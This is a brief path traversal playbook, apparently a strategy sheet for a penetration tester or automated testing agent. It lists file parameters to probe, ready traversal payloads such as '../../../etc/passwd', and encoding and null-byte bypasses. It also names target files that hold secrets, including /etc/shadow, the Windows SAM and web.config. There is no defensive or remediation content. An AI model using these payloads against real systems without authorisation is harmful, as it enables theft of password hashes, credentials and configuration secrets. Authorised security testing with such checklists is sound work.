## Path Traversal Playbook

**STRATEGY:** Escape intended directories to read arbitrary files using `../` sequences.

### Steps
1. Find file parameter: `?file=`, `?path=`, `?page=`, `?doc=`
2. Test basic traversal: `?file=../../../etc/passwd`
3. If you see file contents (root:x:0:0...) → CONFIRMED
4. Try different depths: `../`, `../../`, `../../../`, etc.
5. Test interesting files: `/etc/passwd`, `/etc/shadow`, `C:\Windows\win.ini`

### Common Parameters
- `file`, `filename`, `path`, `filepath`
- `page`, `document`, `doc`
- `template`, `include`, `load`
- `read`, `retrieve`, `download`
- `img`, `image`, `src`

### Bypass Techniques
- URL encoding: `%2e%2e%2f` (../)
- Double encoding: `%252e%252e%252f`
- Null byte (old): `../../../etc/passwd%00.jpg`
- Unicode: `..%c0%af`, `..%ef%bc%8f`
- Backslash (Windows): `..\..\..\`
- Mixed slashes: `....//....//`
- Absolute path: `/etc/passwd` directly

### Target Files
**Linux:**
- `/etc/passwd` - user accounts
- `/etc/shadow` - password hashes (if accessible)
- `/var/log/apache2/access.log` - web logs
- `/proc/self/environ` - environment variables

**Windows:**
- `C:\Windows\win.ini`
- `C:\Windows\System32\config\SAM`
- `C:\inetpub\wwwroot\web.config`

### Indicators of Success
- System file contents returned
- Error messages showing full file paths
- Different responses for existing vs non-existing paths
